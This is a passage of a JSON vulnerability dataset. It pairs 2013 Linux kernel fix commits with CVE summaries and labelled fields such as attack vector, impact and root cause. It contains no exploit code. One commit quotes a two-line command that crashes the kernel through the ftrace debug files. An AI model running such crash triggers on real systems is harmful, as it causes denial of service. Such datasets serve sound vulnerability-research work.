vhost_net_flush vhost_net_ubuf_put_and_wait ha a confusing name : it will actually also free it 's argument","Vulnerability Type":"Resource Management Errors","Attack Vector":"via vectors involving powering on a virtual machine","Impact":"cause a denial of service ( oops and system crash )","Root Cause":"caused by a use-after-free error","Attack Type":"local attacker"},{"commit_id":"307f2fb95e9b96b3577916e73d92e104f8f26494","cve_id":"CVE-2013-4125","cwe_id":"CWE-399","commit_message":"ipv6: only static routes qualify for equal cost multipathing\n\nStatic routes in this case are non-expiring routes which did not get\nconfigured by autoconf or by icmpv6 redirects.\n\nTo make sure we actually get an ecmp route while searching for the first\none in this fib6_node's leafs, also make sure it matches the ecmp route\nassumptions.\n\nv2:\na) Removed RTF_EXPIRE check in dst.from chain. The check of RTF_ADDRCONF\n   already ensures that this route, even if added again without\n   RTF_EXPIRES (in case of a RA announcement with infinite timeout),\n   does not cause the rt6i_nsiblings logic to go wrong if a later RA\n   updates the expiration time later.\n\nv3:\na) Allow RTF_EXPIRES routes to enter the ecmp route set. We have to do so,\n   because an pmtu event could update the RTF_EXPIRES flag and we would\n   not count this route, if another route joins this set. We now filter\n   only for RTF_GATEWAY|RTF_ADDRCONF|RTF_DYNAMIC, which are flags that\n   don't get changed after rt6_info construction.\n\nCc: Nicolas Dichtel <nicolas.dichtel@6wind.com>\nSigned-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The fib6_add_rt2node function in net\/ipv6\/ip6_fib.c in the IPv6 stack in the Linux kernel through 3.10.1 does not properly handle Router Advertisement (RA) messages in certain circumstances involving three routes that initially qualified for membership in an ECMP route set until a change occurred for one of the first two routes, which allows remote attackers to cause a denial of service (system crash) via a crafted sequence of messages.","commit_message_1":"only static route qualify for equal cost multipathing static route in this case are non-expiring route which did not get configured by autoconf or by icmpv6 redirects","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted sequence of messages","Impact":"cause a denial of service ( system crash","Root Cause":"does not properly handle router advertisement ( ra ) messages","Attack Type":"remote attacker"},{"commit_id":"ea702b80e0bbb2448e201472127288beb82ca2fe","cve_id":"CVE-2013-3302","cwe_id":"CWE-362","commit_message":"cifs: move check for NULL socket into smb_send_rqst\n\nCai reported this oops:\n\n[90701.616664] BUG: unable to handle kernel NULL pointer dereference at 0000000000000028\n[90701.625438] IP: [<ffffffff814a343e>] kernel_setsockopt+0x2e\/0x60\n[90701.632167] PGD fea319067 PUD 103fda4067 PMD 0\n[90701.637255] Oops: 0000 [#1] SMP\n[90701.640878] Modules linked in: des_generic md4 nls_utf8 cifs dns_resolver binfmt_misc tun sg igb iTCO_wdt iTCO_vendor_support lpc_ich pcspkr i2c_i801 i2c_core i7core_edac edac_core ioatdma dca mfd_core coretemp kvm_intel kvm crc32c_intel microcode sr_mod cdrom ata_generic sd_mod pata_acpi crc_t10dif ata_piix libata megaraid_sas dm_mirror dm_region_hash dm_log dm_mod\n[90701.677655] CPU 10\n[90701.679808] Pid: 9627, comm: ls Tainted: G        W    3.7.1+ #10 QCI QSSC-S4R\/QSSC-S4R\n[90701.688950] RIP: 0010:[<ffffffff814a343e>]  [<ffffffff814a343e>] kernel_setsockopt+0x2e\/0x60\n[90701.698383] RSP: 0018:ffff88177b431bb8  EFLAGS: 00010206\n[90701.704309] RAX: ffff88177b431fd8 RBX: 00007ffffffff000 RCX: ffff88177b431bec\n[90701.712271] RDX: 0000000000000003 RSI: 0000000000000006 RDI: 0000000000000000\n[90701.720223] RBP: ffff88177b431bc8 R08: 0000000000000004 R09: 0000000000000000\n[90701.728185] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000001\n[90701.736147] R13: ffff88184ef92000 R14: 0000000000000023 R15: ffff88177b431c88\n[90701.744109] FS:  00007fd56a1a47c0(0000) GS:ffff88105fc40000(0000) knlGS:0000000000000000\n[90701.753137] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\n[90701.759550] CR2: 0000000000000028 CR3: 000000104f15f000 CR4: 00000000000007e0\n[90701.767512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[90701.775465] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400\n[90701.783428] Process ls (pid: 9627, threadinfo ffff88177b430000, task ffff88185ca4cb60)\n[90701.792261] Stack:\n[90701.794505]  0000000000000023 ffff88177b431c50 ffff88177b431c38 ffffffffa014fcb1\n[90701.802809]  ffff88184ef921bc 0000000000000000 00000001ffffffff ffff88184ef921c0\n[90701.811123]  ffff88177b431c08 ffffffff815ca3d9 ffff88177b431c18 ffff880857758000\n[90701.819433] Call Trace:\n[90701.822183]  [<ffffffffa014fcb1>] smb_send_rqst+0x71\/0x1f0 [cifs]\n[90701.828991]  [<ffffffff815ca3d9>] ? schedule+0x29\/0x70\n[90701.834736]  [<ffffffffa014fe6d>] smb_sendv+0x3d\/0x40 [cifs]\n[90701.841062]  [<ffffffffa014fe96>] smb_send+0x26\/0x30 [cifs]\n[90701.847291]  [<ffffffffa015801f>] send_nt_cancel+0x6f\/0xd0 [cifs]\n[90701.854102]  [<ffffffffa015075e>] SendReceive+0x18e\/0x360 [cifs]\n[90701.860814]  [<ffffffffa0134a78>] CIFSFindFirst+0x1a8\/0x3f0 [cifs]\n[90701.867724]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1\/0x260 [cifs]\n[90701.875601]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1\/0x260 [cifs]\n[90701.883477]  [<ffffffffa01578e6>] cifs_query_dir_first+0x26\/0x30 [cifs]\n[90701.890869]  [<ffffffffa015480d>] initiate_cifs_search+0xed\/0x250 [cifs]\n[90701.898354]  [<ffffffff81195970>] ? fillonedir+0x100\/0x100\n[90701.904486]  [<ffffffffa01554cb>] cifs_readdir+0x45b\/0x8f0 [cifs]\n[90701.911288]  [<ffffffff81195970>] ? fillonedir+0x100\/0x100\n[90701.917410]  [<ffffffff81195970>] ? fillonedir+0x100\/0x100\n[90701.923533]  [<ffffffff81195970>] ? fillonedir+0x100\/0x100\n[90701.929657]  [<ffffffff81195848>] vfs_readdir+0xb8\/0xe0\n[90701.935490]  [<ffffffff81195b9f>] sys_getdents+0x8f\/0x110\n[90701.941521]  [<ffffffff815d3b99>] system_call_fastpath+0x16\/0x1b\n[90701.948222] Code: 66 90 55 65 48 8b 04 25 f0 c6 00 00 48 89 e5 53 48 83 ec 08 83 fe 01 48 8b 98 48 e0 ff ff 48 c7 80 48 e0 ff ff ff ff ff ff 74 22 <48> 8b 47 28 ff 50 68 65 48 8b 14 25 f0 c6 00 00 48 89 9a 48 e0\n[90701.970313] RIP  [<ffffffff814a343e>] kernel_setsockopt+0x2e\/0x60\n[90701.977125]  RSP <ffff88177b431bb8>\n[90701.981018] CR2: 0000000000000028\n[90701.984809] ---[ end trace 24bd602971110a43 ]---\n\nThis is likely due to a race vs. a reconnection event.\n\nThe current code checks for a NULL socket in smb_send_kvec, but that's\ntoo late. By the time that check is done, the socket will already have\nbeen passed to kernel_setsockopt. Move the check into smb_send_rqst, so\nthat it's checked earlier.\n\nIn truth, this is a bit of a half-assed fix. The -ENOTSOCK error\nreturn here looks like it could bubble back up to userspace. The locking\nrules around the ssocket pointer are really unclear as well. There are\ncases where the ssocket pointer is changed without holding the srv_mutex,\nbut I'm not clear whether there's a potential race here yet or not.\n\nThis code seems like it could benefit from some fundamental re-think of\nhow the socket handling should behave. Until then though, this patch\nshould at least fix the above oops in most cases.\n\nCc: <stable@vger.kernel.org> # 3.7+\nReported-and-Tested-by: CAI Qian <caiqian@redhat.com>\nSigned-off-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <smfrench@gmail.com>","summary":"Race condition in the smb_send_rqst function in fs\/cifs\/transport.c in the Linux kernel before 3.7.2 allows local users to cause a denial of service (NULL pointer dereference and OOPS) or possibly have unspecified other impact via vectors involving a reconnection event.","commit_message_1":"move check for null socket into smb_send_rqst cai reported this oops : [ <file> ] bug : unable to handle kernel null pointer dereference at <number> [ <file> ] ip : [ < ffffffff814a343e > ] kernel_setsockopt+0x2e\/0x60 [ <file> ] pgd fea319067 pud 103fda4067 pmd <number> [ <file> ] oops : <number> [ # <number> ] smp [ <file> ] module linked in : des_generic md4 nls_utf8 cifs dns_resolver binfmt_misc tun sg igb itco_wdt itco_vendor_support lpc_ich pcspkr i2c_i801 i2c_core i7core_edac edac_core ioatdma dca mfd_core coretemp kvm_intel kvm crc32c_intel microcode sr_mod cdrom ata_generic sd_mod pata_acpi crc_t10dif ata_piix libata megaraid_sas dm_mirror dm_region_hash dm_log dm_mod [ <file> ] cpu <number> [ <file> ] pid : <number> , comm : l tainted : g w <file>","Vulnerability Type":"Race Condition","Attack Vector":"via vectors involving a reconnection event","Impact":"cause a denial of service ( pointer dereference and oops ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"6a76f8c0ab19f215af2a3442870eeb5f0e81998d","cve_id":"CVE-2013-3301","cwe_id":null,"commit_message":"tracing: Fix possible NULL pointer dereferences\n\nCurrently set_ftrace_pid and set_graph_function files use seq_lseek\nfor their fops.  However seq_open() is called only for FMODE_READ in\nthe fops->open() so that if an user tries to seek one of those file\nwhen she open it for writing, it sees NULL seq_file and then panic.\n\nIt can be easily reproduced with following command:\n\n  $ cd \/sys\/kernel\/debug\/tracing\n  $ echo 1234 | sudo tee -a set_ftrace_pid\n\nIn this example, GNU coreutils' tee opens the file with fopen(, \"a\")\nand then the fopen() internally calls lseek().\n\nLink: http:\/\/lkml.kernel.org\/r\/1365663302-2170-1-git-send-email-namhyung@kernel.org\n\nCc: Frederic Weisbecker <fweisbec@gmail.com>\nCc: Ingo Molnar <mingo@kernel.org>\nCc: Namhyung Kim <namhyung.kim@lge.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Namhyung Kim <namhyung@kernel.org>\nSigned-off-by: Steven Rostedt <rostedt@goodmis.org>","summary":"The ftrace implementation in the Linux kernel before 3.8.8 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by leveraging the CAP_SYS_ADMIN capability for write access to the (1) set_ftrace_pid or (2) set_graph_function file, and then making an lseek system call.","commit_message_1":"fix possible null pointer dereferences currently set_ftrace_pid and set_graph_function file use seq_lseek for their fop","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by leveraging the cap _ sys _ admin capability for write access to the ( 1 ) set _ ftrace _ pid or ( 2 ) set _ graph _ function file , and then making an lseek system call","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"d5e0d0f607a7a029c6563a0470d88255c89a8d11","cve_id":"CVE-2013-3237","cwe_id":"CWE-200","commit_message":"VSOCK: Fix missing msg_namelen update in vsock_stream_recvmsg()\n\nThe code misses to update the msg_namelen member to 0 and therefore\nmakes net\/socket.c leak the local, uninitialized sockaddr_storage\nvariable to userland -- 128 bytes of kernel stack memory.\n\nCc: Andy King <acking@vmware.com>\nCc: Dmitry Torokhov <dtor@vmware.com>\nCc: George Zhang <georgezhang@vmware.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The vsock_stream_sendmsg function in net\/vmw_vsock\/af_vsock.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix missing msg_namelen update in vsock_stream_recvmsg ( ) the code miss to update the msg_namelen member to <number> and therefore make net\/<file> leak the local , uninitialized sockaddr_storage variable to userland -- <number> byte of kernel stack memory","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable ","Attack Type":"local attacker"},{"commit_id":"680d04e0ba7e926233e3b9cee59125ce181f66ba","cve_id":"CVE-2013-3236","cwe_id":"CWE-200","commit_message":"VSOCK: vmci - fix possible info leak in vmci_transport_dgram_dequeue()\n\nIn case we received no data on the call to skb_recv_datagram(), i.e.\nskb->data is NULL, vmci_transport_dgram_dequeue() will return with 0\nwithout updating msg_namelen leading to net\/socket.c leaking the local,\nuninitialized sockaddr_storage variable to userland -- 128 bytes of\nkernel stack memory.\n\nFix this by moving the already existing msg_namelen assignment a few\nlines above.\n\nCc: Andy King <acking@vmware.com>\nCc: Dmitry Torokhov <dtor@vmware.com>\nCc: George Zhang <georgezhang@vmware.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The vmci_transport_dgram_dequeue function in net\/vmw_vsock\/vmci_transport.c in the Linux kernel before 3.9-rc7 does not properly initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"vmci - fix possible info leak in vmci_transport_dgram_dequeue ( ) in case we received no data on the call to skb_recv_datagram ( ) , <file>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly initialize a certain length variable","Attack Type":"local attacker"},{"commit_id":"60085c3d009b0df252547adb336d1ccca5ce52ec","cve_id":"CVE-2013-3235","cwe_id":"CWE-200","commit_message":"tipc: fix info leaks via msg_name in recv_msg\/recv_stream\n\nThe code in set_orig_addr() does not initialize all of the members of\nstruct sockaddr_tipc when filling the sockaddr info -- namely the union\nis only partly filled. This will make recv_msg() and recv_stream() --\nthe only users of this function -- leak kernel stack memory as the\nmsg_name member is a local variable in net\/socket.c.\n\nAdditionally to that both recv_msg() and recv_stream() fail to update\nthe msg_namelen member to 0 while otherwise returning with 0, i.e.\n\"success\". This is the case for, e.g., non-blocking sockets. This will\nlead to a 128 byte kernel stack leak in net\/socket.c.\n\nFix the first issue by initializing the memory of the union with\nmemset(0). Fix the second one by setting msg_namelen to 0 early as it\nwill be updated later if we're going to fill the msg_name member.\n\nCc: Jon Maloy <jon.maloy@ericsson.com>\nCc: Allan Stephens <allan.stephens@windriver.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/tipc\/socket.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure and a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix info leak via msg_name in recv_msg\/recv_stream the code in set_orig_addr ( ) doe not initialize all of the member of struct sockaddr_tipc when filling the sockaddr info -- namely the union is only partly filled","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure and a certain length variable","Attack Type":"local attacker"},{"commit_id":"4a184233f21645cf0b719366210ed445d1024d72","cve_id":"CVE-2013-3234","cwe_id":"CWE-200","commit_message":"rose: fix info leak via msg_name in rose_recvmsg()\n\nThe code in rose_recvmsg() does not initialize all of the members of\nstruct sockaddr_rose\/full_sockaddr_rose when filling the sockaddr info.\nNor does it initialize the padding bytes of the structure inserted by\nthe compiler for alignment. This will lead to leaking uninitialized\nkernel stack bytes in net\/socket.c.\n\nFix the issue by initializing the memory used for sockaddr info with\nmemset(0).\n\nCc: Ralf Baechle <ralf@linux-mips.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rose_recvmsg function in net\/rose\/af_rose.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix info leak via msg_name in rose_recvmsg ( ) the code in rose_recvmsg ( ) doe not initialize all of the member of struct sockaddr_rose\/full_sockaddr_rose when filling the sockaddr info","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"d26d6504f23e803824e8ebd14e52d4fc0a0b09cb","cve_id":"CVE-2013-3233","cwe_id":"CWE-200","commit_message":"NFC: llcp: fix info leaks via msg_name in llcp_sock_recvmsg()\n\nThe code in llcp_sock_recvmsg() does not initialize all the members of\nstruct sockaddr_nfc_llcp when filling the sockaddr info. Nor does it\ninitialize the padding bytes of the structure inserted by the compiler\nfor alignment.\n\nAlso, if the socket is in state LLCP_CLOSED or is shutting down during\nreceive the msg_namelen member is not updated to 0 while otherwise\nreturning with 0, i.e. \"success\". The msg_namelen update is also\nmissing for stream and seqpacket sockets which don't fill the sockaddr\ninfo.\n\nBoth issues lead to the fact that the code will leak uninitialized\nkernel stack bytes in net\/socket.c.\n\nFix the first issue by initializing the memory used for sockaddr info\nwith memset(0). Fix the second one by setting msg_namelen to 0 early.\nIt will be updated later if we're going to fill the msg_name member.\n\nCc: Lauro Ramos Venancio <lauro.venancio@openbossa.org>\nCc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org>\nCc: Samuel Ortiz <sameo@linux.intel.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The llcp_sock_recvmsg function in net\/nfc\/llcp\/sock.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable and a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"llcp : fix info leak via msg_name in llcp_sock_recvmsg ( ) the code in llcp_sock_recvmsg ( ) doe not initialize all the member of struct sockaddr_nfc_llcp when filling the sockaddr info","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable and a certain data structure","Attack Type":"local attacker"},{"commit_id":"3ce5efad47b62c57a4f5c54248347085a750ce0e","cve_id":"CVE-2013-3232","cwe_id":"CWE-200","commit_message":"netrom: fix info leak via msg_name in nr_recvmsg()\n\nIn case msg_name is set the sockaddr info gets filled out, as\nrequested, but the code fails to initialize the padding bytes of\nstruct sockaddr_ax25 inserted by the compiler for alignment. Also\nthe sax25_ndigis member does not get assigned, leaking four more\nbytes.\n\nBoth issues lead to the fact that the code will leak uninitialized\nkernel stack bytes in net\/socket.c.\n\nFix both issues by initializing the memory with memset(0).\n\nCc: Ralf Baechle <ralf@linux-mips.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The nr_recvmsg function in net\/netrom\/af_netrom.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix info leak via msg_name in nr_recvmsg ( ) in case msg_name is set the sockaddr info get filled out , a requested , but the code fails to initialize the padding byte of struct sockaddr_ax25 inserted by the compiler for alignment","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"c77a4b9cffb6215a15196ec499490d116dfad181","cve_id":"CVE-2013-3231","cwe_id":"CWE-200","commit_message":"llc: Fix missing msg_namelen update in llc_ui_recvmsg()\n\nFor stream sockets the code misses to update the msg_namelen member\nto 0 and therefore makes net\/socket.c leak the local, uninitialized\nsockaddr_storage variable to userland -- 128 bytes of kernel stack\nmemory. The msg_namelen update is also missing for datagram sockets\nin case the socket is shutting down during receive.\n\nFix both issues by setting msg_namelen to 0 early. It will be\nupdated later if we're going to fill the msg_name member.\n\nCc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The llc_ui_recvmsg function in net\/llc\/af_llc.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix missing msg_namelen update in llc_ui_recvmsg ( ) for stream socket the code miss to update the msg_namelen member to <number> and therefore make net\/<file> leak the local , uninitialized sockaddr_storage variable to userland -- <number> byte of kernel stack memory","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable ","Attack Type":"local attacker"},{"commit_id":"b860d3cc62877fad02863e2a08efff69a19382d2","cve_id":"CVE-2013-3230","cwe_id":"CWE-200","commit_message":"l2tp: fix info leak in l2tp_ip6_recvmsg()\n\nThe L2TP code for IPv6 fails to initialize the l2tp_conn_id member of\nstruct sockaddr_l2tpip6 and therefore leaks four bytes kernel stack\nin l2tp_ip6_recvmsg() in case msg_name is set.\n\nInitialize l2tp_conn_id with 0 to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The l2tp_ip6_recvmsg function in net\/l2tp\/l2tp_ip6.c in the Linux kernel before 3.9-rc7 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix info leak in l2tp_ip6_recvmsg ( ) the l2tp code for ipv6 fails to initialize the l2tp_conn_id member of struct sockaddr_l2tpip6 and therefore leak four byte kernel stack in l2tp_ip6_recvmsg ( ) in case msg_name is set","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"to obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure member ","Attack Type":"local attacker"},{"commit_id":"a5598bd9c087dc0efc250a5221e5d0e6f584ee88","cve_id":"CVE-2013-3229","cwe_id":"CWE-200","commit_message":"iucv: Fix missing msg_namelen update in iucv_sock_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set.\nIt also does not set the msg_namelen member to 0 and therefore makes\nnet\/socket.c leak the local, uninitialized sockaddr_storage variable\nto userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared\nabout iucv_sock_recvmsg() not filling the msg_name in case it was set.\n\nCc: Ursula Braun <ursula.braun@de.ibm.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The iucv_sock_recvmsg function in net\/iucv\/af_iucv.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix missing msg_namelen update in iucv_sock_recvmsg ( ) the current code doe not fill the msg_name member in case it is set","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable ","Attack Type":"local attacker"},{"commit_id":"5ae94c0d2f0bed41d6718be743985d61b7f5c47d","cve_id":"CVE-2013-3228","cwe_id":"CWE-200","commit_message":"irda: Fix missing msg_namelen update in irda_recvmsg_dgram()\n\nThe current code does not fill the msg_name member in case it is set.\nIt also does not set the msg_namelen member to 0 and therefore makes\nnet\/socket.c leak the local, uninitialized sockaddr_storage variable\nto userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared\nabout irda_recvmsg_dgram() not filling the msg_name in case it was\nset.\n\nCc: Samuel Ortiz <samuel@sortiz.org>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The irda_recvmsg_dgram function in net\/irda\/af_irda.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix missing msg_namelen update in irda_recvmsg_dgram ( ) the current code doe not fill the msg_name member in case it is set","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable ","Attack Type":"local attacker"},{"commit_id":"2d6fbfe733f35c6b355c216644e08e149c61b271","cve_id":"CVE-2013-3227","cwe_id":"CWE-200","commit_message":"caif: Fix missing msg_namelen update in caif_seqpkt_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set.\nIt also does not set the msg_namelen member to 0 and therefore makes\nnet\/socket.c leak the local, uninitialized sockaddr_storage variable\nto userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared\nabout caif_seqpkt_recvmsg() not filling the msg_name in case it was\nset.\n\nCc: Sjur Braendeland <sjur.brandeland@stericsson.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The caif_seqpkt_recvmsg function in net\/caif\/caif_socket.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix missing msg_namelen update in caif_seqpkt_recvmsg ( ) the current code doe not fill the msg_name member in case it is set","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable ","Attack Type":"local attacker"},{"commit_id":"c8c499175f7d295ef867335bceb9a76a2c3cdc38","cve_id":"CVE-2013-3226","cwe_id":"CWE-200","commit_message":"Bluetooth: SCO - Fix missing msg_namelen update in sco_sock_recvmsg()\n\nIf the socket is in state BT_CONNECT2 and BT_SK_DEFER_SETUP is set in\nthe flags, sco_sock_recvmsg() returns early with 0 without updating the\npossibly set msg_namelen member. This, in turn, leads to a 128 byte\nkernel stack leak in net\/socket.c.\n\nFix this by updating msg_namelen in this case. For all other cases it\nwill be handled in bt_sock_recvmsg().\n\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sco_sock_recvmsg function in net\/bluetooth\/sco.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"sco - fix missing msg_namelen update in sco_sock_recvmsg ( ) if the socket is in state bt_connect2 and bt_sk_defer_setup is set in the flag , sco_sock_recvmsg ( ) return early with <number> without updating the possibly set msg_namelen member","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable ","Attack Type":"local attacker"},{"commit_id":"e11e0455c0d7d3d62276a0c55d9dfbc16779d691","cve_id":"CVE-2013-3225","cwe_id":"CWE-200","commit_message":"Bluetooth: RFCOMM - Fix missing msg_namelen update in rfcomm_sock_recvmsg()\n\nIf RFCOMM_DEFER_SETUP is set in the flags, rfcomm_sock_recvmsg() returns\nearly with 0 without updating the possibly set msg_namelen member. This,\nin turn, leads to a 128 byte kernel stack leak in net\/socket.c.\n\nFix this by updating msg_namelen in this case. For all other cases it\nwill be handled in bt_sock_stream_recvmsg().\n\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rfcomm_sock_recvmsg function in net\/bluetooth\/rfcomm\/sock.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"rfcomm - fix missing msg_namelen update in rfcomm_sock_recvmsg ( ) if rfcomm_defer_setup is set in the flag , rfcomm_sock_recvmsg ( ) return early with <number> without updating the possibly set msg_namelen member","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain length variable ","Attack Type":"local attacker"},{"commit_id":"4683f42fde3977bdb4e8a09622788cc8b5313778","cve_id":"CVE-2013-3224","cwe_id":"CWE-200","commit_message":"Bluetooth: fix possible info leak in bt_sock_recvmsg()\n\nIn case the socket is already shutting down, bt_sock_recvmsg() returns\nwith 0 without updating msg_namelen leading to net\/socket.c leaking the\nlocal, uninitialized sockaddr_storage variable to userland -- 128 bytes\nof kernel stack memory.\n\nFix this by moving the msg_namelen assignment in front of the shutdown\ntest.\n\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The bt_sock_recvmsg function in net\/bluetooth\/af_bluetooth.c in the Linux kernel before 3.9-rc7 does not properly initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix possible info leak in bt_sock_recvmsg ( ) in case the socket is already shutting down , 